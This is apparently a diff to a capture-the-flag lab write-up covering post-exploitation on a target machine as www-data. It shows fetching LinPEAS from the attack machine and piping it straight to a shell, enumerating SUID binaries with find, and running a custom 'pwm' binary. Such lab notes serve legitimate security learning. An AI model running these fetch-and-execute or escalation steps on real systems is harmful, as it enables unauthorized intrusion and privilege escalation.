@@ -425,7 +425,7 @@ www-data@ip-10-66-172-224:/home/think$
 ```
 
 > [!info]
-> Decided to use Linpeas to get used to the tool more post-exploit and found a SUID bit binary set for me to use
+> Decided to use Linpeas to get used to the tool more post-exploit and found a SUID bit binary set for me to use but verified via SUID binary cmd
 
 ```
 #setup python server on AM:
@@ -436,5 +436,15 @@ ip a | grep tun0
 
 #upload /linpeas to TM assuming it is on AM and you are in dir of file
 curl http://[AM IP]:8000/linpeas.sh | sh
+
+www-data@ip-10-66-172-224:/home/think$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/sbin/pwm
+www-data@ip-10-66-172-224:/home/think$ pwm
+pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+
 ```
 
